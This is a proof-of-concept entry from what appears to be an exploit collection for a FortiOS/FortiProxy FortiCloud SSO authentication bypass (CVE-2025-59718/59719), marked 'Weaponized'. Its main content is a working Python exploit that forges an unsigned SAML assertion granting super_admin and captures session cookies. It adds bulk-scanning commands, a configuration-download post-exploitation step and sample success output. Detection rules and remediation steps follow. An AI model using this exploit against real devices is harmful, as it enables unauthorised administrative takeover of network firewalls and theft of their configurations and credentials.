# Fortinet FortiCloud SSO Authentication Bypass

<!-- 
  File: 2026-05-17_fortinet-forticloud-sso-auth-bypass.md
  Location: pocs/network/
-->

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-05-17 |
| **Last Updated** | 2025-12-22 |
| **Author / Researcher** | exfil0 |
| **CVE / Advisory** | CVE-2025-59718, CVE-2025-59719 (Advisory: FG-IR-25-647) |
| **Category** | network |
| **Severity** | Critical |
| **CVSS Score** | 9.8 (CVSSv3) |
| **Status** | Weaponized |
| **Tags** | auth-bypass, SAML, SSO, unauthenticated, FortiOS, FortiProxy, FortiSwitchManager, active-exploitation |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | Fortinet FortiOS, FortiProxy, FortiSwitchManager (FortiCloud SSO feature) |
| **Versions Affected** | FortiOS prior to 7.4.9; see Fortinet advisory FG-IR-25-647 for full version matrix |
| **Language / Platform** | Python 3.8+; targets any Fortinet product with FortiCloud SSO enabled |
| **Authentication Required** | No (unauthenticated) |
| **Network Access Required** | Yes (network access to management interface) |

---

## Summary

CVE-2025-59718 and CVE-2025-59719 are closely related authentication-bypass vulnerabilities (CWE-347: Improper Verification of Cryptographic Signature) in Fortinet products that use the FortiCloud SSO login feature. Both were disclosed by Fortinet on 9 December 2025. An unauthenticated remote attacker can craft and submit an unsigned SAML response to the FortiCloud SSO endpoint, causing the device to authenticate the attacker with administrative privileges. As of December 22, 2025, this vulnerability is actively exploited in the wild. Immediate patching and disabling of FortiCloud SSO is strongly recommended.

---

## Vulnerability Details

### Root Cause

The SAML response handler in the FortiCloud SSO login flow does not validate the cryptographic signature of the SAML assertion before processing it (CWE-347). An attacker can submit a self-crafted, unsigned SAML response with any username and role (e.g., `super_admin`), and the product accepts it as a legitimate authentication assertion from the FortiCloud SSO identity provider.

### Attack Vector

An unauthenticated attacker sends an HTTP POST request to the SAML consumer endpoint (default: `/remote/saml/login`) with a crafted `SAMLResponse` parameter containing an unsigned assertion. The assertion includes a target username, role `super_admin`, and a dynamically generated valid-looking issuer and timestamp. The device processes the SAML response without signature verification and establishes an administrative session.

### Impact

Full administrative access to the targeted Fortinet device as any impersonated user. Post-exploitation capabilities include downloading the running system configuration file via `/api/v2/monitor/system/config/backup`, performing SAML token replay, and SSO session hijacking. On affected internet-facing devices, this translates to complete network security control including firewall policy modification, VPN access, and credential exposure.

---

## Environment / Lab Setup

```
OS:          Linux / macOS / Windows (any with Python 3.8+)
Target:      Fortinet FortiOS < 7.4.9 with FortiCloud SSO enabled
Attacker:    Any host with network access to the target management interface
Tools:       Python 3.8+, pip (requests, argparse)
```

### Setup Steps

```bash
# Install dependencies
pip install requests argparse

# Verify target has FortiCloud SSO enabled (check web UI or config)
# Note: exploit fails silently on patched or SSO-disabled targets
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Confirm target reachability** - Ensure the FortiOS management interface is accessible and FortiCloud SSO is enabled.
   ```bash
   curl -sk https://<TARGET>/remote/saml/login -o /dev/null -w "%{http_code}"
   # Expect 200 or 302 to SSO redirect
   ```

2. **Run the exploit** - Single target scan impersonating `admin` user.
   ```bash
   python exploit.py --target <TARGET_IP> --username admin
   ```

3. **Post-exploitation** - Download system configuration on successful bypass.
   ```bash
   python exploit.py --target <TARGET_IP> --username admin --post-auth-config
   ```

4. **Bulk scan** - Scan multiple targets in parallel.
   ```bash
   python exploit.py --file targets.txt --max-threads 20 --post-auth-config --output-file results.csv
   ```

### Exploit Code

> See `exploit.py` in this folder.

```python
# Minimal inline PoC - generates unsigned SAML bypass payload
import requests, base64
from datetime import datetime, timedelta

TARGET = "https://192.168.1.1"
USERNAME = "admin"
ENDPOINT = "/remote/saml/login"

now = datetime.utcnow()
saml = f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="_bypass1337" Version="2.0" IssueInstant="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}"
    Destination="{TARGET}{ENDPOINT}">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0">
    <saml:Issuer>https://sso.forticloud.com</saml:Issuer>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>super_admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>"""

r = requests.post(f"{TARGET}{ENDPOINT}",
                  data={"SAMLResponse": base64.b64encode(saml.encode()).decode(), "RelayState": ""},
                  verify=False, allow_redirects=True, timeout=15)
if r.status_code in [200, 302] and any(k in r.text.lower() for k in ["dashboard", "logout", "fortios"]):
    print(f"[+] VULNERABLE - Authenticated as {USERNAME}")
    print(f"[+] Cookies: {r.cookies.get_dict()}")
```

### Expected Output

```
2025-12-22 12:00:00,000 - INFO - [+] Targeting: https://192.168.1.1/remote/saml/login (Thread: ThreadPoolExecutor-0_0)
2025-12-22 12:00:00,521 - INFO - [+++] SUCCESS - Vulnerable: https://192.168.1.1 (Authenticated as admin)
2025-12-22 12:00:00,521 - INFO - [+] Cookies: {'APSCOOKIE_9443': 'Era%3D0...'}
2025-12-22 12:00:00,521 - INFO - [+] URL: https://192.168.1.1/ng/
```

---

## Screenshots / Evidence

<!-- Add paths to screenshots or embed them -->
- No screenshots included in source repository.

---

## Detection & Indicators of Compromise

```
# Web server log pattern - unsigned SAML POST to SSO endpoint
POST /remote/saml/login HTTP/1.1 200 - "SAMLResponse=<base64>..." 
# Suspicious if: no prior GET /remote/saml/login redirect, SAMLResponse submitted directly

# Successful auth events from unexpected source IPs in FortiOS event log
type=event subtype=user action=login status=success msg="Administrator admin logged in successfully from <IP>"

# Config download activity
GET /api/v2/monitor/system/config/backup?scope=global HTTP/1.1 200
```

**SIEM / IDS Rule (example):**
```
alert http any any -> $FORTINET_MGMT any (msg:"CVE-2025-59718 SAML Bypass Attempt"; content:"POST"; http_method; content:"/remote/saml/login"; http_uri; content:"SAMLResponse="; http_client_body; sid:9002025; rev:1;)
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | Upgrade FortiOS to 7.4.9 or later; see Fortinet advisory FG-IR-25-647 for full version matrix |
| **Workaround** | Disable FortiCloud SSO via CLI: `config system global` / `set admin-forticloud-sso-login disable` / `end` |
| **Config Hardening** | Restrict management interface access to trusted IP ranges; enable MFA for admin accounts |

---

## References

- [CVE-2025-59718](https://nvd.nist.gov/vuln/detail/CVE-2025-59718)
- [CVE-2025-59719](https://nvd.nist.gov/vuln/detail/CVE-2025-59719)
- [Fortinet Advisory FG-IR-25-647](https://www.fortiguard.com/psirt/FG-IR-25-647)
- [Source Repository](https://github.com/exfil0/CVE-2025-59718-PoC)

---

## Notes

Both CVE-2025-59718 and CVE-2025-59719 share the same CWE-347 root cause and affect the FortiCloud SSO SAML flow; they are frequently exploited together. The vulnerability was actively exploited in the wild as of December 22, 2025. The PoC supports bulk scanning with threading and post-exploitation config exfiltration. Auto-ingested from https://github.com/exfil0/CVE-2025-59718-PoC on 2026-05-17.
